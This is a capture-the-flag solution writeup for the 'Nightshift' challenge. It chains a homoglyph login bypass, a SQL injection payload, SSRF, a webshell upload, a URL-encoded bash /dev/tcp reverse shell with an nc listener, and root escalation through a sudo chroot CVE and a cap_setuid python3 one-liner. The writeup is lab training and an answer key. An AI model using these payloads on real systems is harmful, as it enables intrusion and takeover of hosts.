# Nightshift — Solution Writeup

Full chain: **network forensics → homoglyph auth bypass → SQLi → action-ID
leak → SSRF → parallel crypto/forensics branches → convergence → webshell →
privesc → final flag.**

`solve.sh` in this directory automates stages 1–7 against a running instance.
Stages 8–9 (webshell, privesc) are interactive and documented below.

---

## Stage 0 — The packet capture

Open `handout/capture.pcap` in Wireshark.

- **Homoglyph login.** Three `POST /register` attempts. `admin@...` (real `@`,
  `%40`) → 403. `operator＠...` (`%EF%BC%A0` = fullwidth U+FF20) → 302. The
  winning email uses a Unicode look-alike, not a real `@`.
- **FTP.** Creds `svcbackup` / `Backup$2024!`. `MDTM manifest.txt` →
  `213 20240801000000` → epoch **1722470400** (Branch A key). `PASV` response
  `(10,0,0,10,20,21)` → port `20*256+21 = 5141`; follow that stream for the
  transferred manifest (a lore breadcrumb).
- **Steghide passphrase.** `X-Session-Key: n1ghtsh1ft_0ps_2024`.
- **Red herring.** `/api/debug` returns a fake flag — ignore it.

## Stage 1 — Web exploitation

- **Auth bypass.** The reserved-name check runs on the raw string *before*
  NFKC normalization. `admin＠nightshift-corp.com` (fullwidth @) skips the
  check, then normalizes to the real admin identity. (The pcap only shows
  `operator` — you must generalize to `admin` yourself.)
- **SQLi.** Services search is string-concatenated SQL. Payload:
  `x' UNION SELECT name,hostname,note FROM services --` → leaks
  `internal-fileserver:8080`.
- **Action-ID leak.** `GET /internal/actions` (unauthenticated) discloses the
  hidden webhook action ID `act_7f3a9c2e1b48`.
- **SSRF.** `POST /actions/act_7f3a9c2e1b48` with
  `X-Forwarded-Host: internal-fileserver:8080` and `path=/files/` proxies into
  the internal-only fileserver. Pull all artifacts.

Decoys on the fileserver: `vault_old.enc` opens with `summer2023` (hinted by
the shelf README) to a fake flag — a dead end by design.

## Stage 2 — Branch A (crypto)

`encrypt.py` uses AES-CTR, key `SHA256(pack('>Q', ts))[:16]`, hardcoded zero
nonce. Two paths:

- **Timestamp:** use `1722470400` from the pcap → derive key → decrypt
  `vault.enc` → `signing_token: Y3IxYl9kcjRn` → base64 → **`cr1b_dr4g`**.
- **Nonce reuse (no timestamp):** `vault.enc` and `notice.enc` share key+nonce.
  XOR them, use the letterhead from `retention_policy.txt` as known-plaintext
  to crib-drag. (Hinted in `encrypt.py`: "two messages lit by one flame.")

## Stage 3 — Branch B (forensics)

- `binwalk -e memory.lime` → a PNG and a JPG.
- `zsteg <png>` (standard LSB plane) → `NIGHTSHIFT_HINT:<base64>` → decodes to
  "jpg is steghide-protected. key went out in cleartext during the incident."
- `steghide extract -sf <jpg> -p n1ghtsh1ft_0ps_2024` → `FRAG_B:c3QzZzA=` →
  base64 → **`st3g0`**.

## Stage 4 — Convergence

`readme.enc` opens with the **plain concatenation** `cr1b_dr4gst3g0`:
```bash
openssl enc -d -aes-256-cbc -pbkdf2 -in readme.enc -pass pass:"cr1b_dr4gst3g0"
```
The note reveals the real passphrase joins the two with an **underscore**:
`cr1b_dr4g_st3g0`.

## Stage 5 — Webshell → reverse shell

`backup.jpg` is actually PHP (`file backup.jpg` → "PHP script"). Rename to
`shell.php`, upload via FTP (`svcbackup` / `Backup$2024!`, jailed to
`/uploads`), and trigger it through the SSRF action.

**Smoke test — plain command exec.** No shell metacharacters, so it can go raw:
```
path=/uploads/shell.php?cmd=id
```
You should see `uid=33(www-data) ...` proxied back.

> **Why the naive reverse-shell one-liner fails (and how to fix it).**
> The SSRF action forwards your `path` with a raw string concat —
> `requests.get(f"http://{host}{path}", timeout=5)`. Two consequences you must
> work around:
>   1. **`&` truncates the command.** A reverse shell one-liner contains `>&`
>      and `0>&1`; the unescaped `&` is a query-param separator, so `$_GET['cmd']`
>      arrives cut off at the first `&` (you'd get `bash -c 'bash -i >`). The
>      entire `cmd` value must be **URL-encoded**. Note this lives in the `path`
>      *form field*, so `curl --data-urlencode` won't encode the query for you —
>      encode the `?cmd=` portion yourself.
>   2. **An interactive shell blocks past the 5s proxy timeout.** `system()`
>      won't return while the shell is live, so the action hits `timeout=5`,
>      returns 502, and tears the child down. **Background and detach** the shell
>      (`setsid … &`) so `system()` returns immediately and the callback survives.
>
> Also: `system()` runs under `/bin/sh` (dash on Ubuntu 24.04), and `/dev/tcp`
> is a bash-ism — the `bash -c '…'` wrapper is mandatory, not cosmetic.

**Interactive reverse shell.** Start a listener:
```bash
nc -lvnp 4444
```
The payload, in readable form, is:
```
bash -c 'setsid bash -i >& /dev/tcp/host.docker.internal/4444 0>&1 &'
```
URL-encoded for the `?cmd=` trigger (this is what you actually send):
```
path=/uploads/shell.php?cmd=bash%20-c%20%27setsid%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fhost.docker.internal%2F4444%200%3E%261%20%26%27
```
Lands as low-priv **`www-data`**.

> **Callback target.** `host.docker.internal` only resolves inside the
> ops-server container when the compose file maps it — this repo now sets
> `extra_hosts: ["host.docker.internal:host-gateway"]` on `ops-server`, so a
> listener on the **docker host** works. If instead you're catching the shell
> on a remote box (a hosted CTF where players use their own machine), drop
> `host.docker.internal`, put your reachable IP in the payload, and make sure
> the ops-server container has outbound egress to it.

## Stage 6 — Privilege escalation

Two independent paths:

- **CVE-2025-32463 (sudo chroot).** `sudo` is pinned to `1.9.15p5-3ubuntu5`.
  The Stratascale PoC (malicious chroot + `nsswitch.conf` loading a shared lib
  whose constructor calls `setreuid(0,0)`) gives root with **no sudo rule
  required**. (Hinted in `deploy.log`: "the guard walks into the room before
  he checks the badge.")
- **Capability misconfig.** `getcap -r / 2>/dev/null` shows `cap_setuid` on
  python3: `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`.

## Stage 7 — Final flag

Copy `/root/flag.enc` out, decrypt with the underscore passphrase:
```bash
openssl enc -d -aes-256-cbc -pbkdf2 -in flag.enc -pass pass:"cr1b_dr4g_st3g0"
```
→ `EH4X{full_chain_no_shortcuts_taken}`

---

## In-lore hints (no player-visible sub-flags)

| Location | Hint | Points at |
|---|---|---|
| pcap manifest | "two doors, one key... one half will not name the whole" | branches converge |
| dashboard | "checks the ones it was given" | validate-before-normalize |
| files README | "season and year... summer of '23" | fake-vault password |
| files README | "the courier signs twice" | FTP PASV two-channel |
| encrypt.py | "two messages lit by one flame" | nonce reuse / XOR |
| deploy.log | "the guard... before he checks the badge" | sudo chroot CVE |
| /root/.last_entry | "the wall between them matters" | underscore join |
